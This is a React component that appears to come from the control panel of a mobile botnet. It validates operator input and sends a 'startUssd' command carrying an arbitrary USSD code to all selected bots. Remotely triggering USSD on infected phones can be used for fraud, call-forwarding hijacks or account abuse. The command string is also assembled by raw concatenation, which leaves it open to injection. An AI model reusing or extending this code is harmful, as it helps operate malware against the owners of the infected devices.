import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default () => {
  const { state, setState } = useContext(BotContext)
  const [app, setApp] = useState('')

  const submit = () => {
    if (app == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the USSD.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"startUssd","ussd":"' + app + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }
  return (
    <div className="pb-6">
      <h2 className="text-xl">Send USSD</h2>
      <p className="text-stone-500">Send USSD from selected bots</p>
      <Input placeholder="*999# USSD" className="!mb-2" value={app} onChange={(e: any) => setApp(e.target.value)}/>
      <Button ghost type="primary" className="float-right" onClick={submit}>Send USSD</Button>
    </div>
  )
}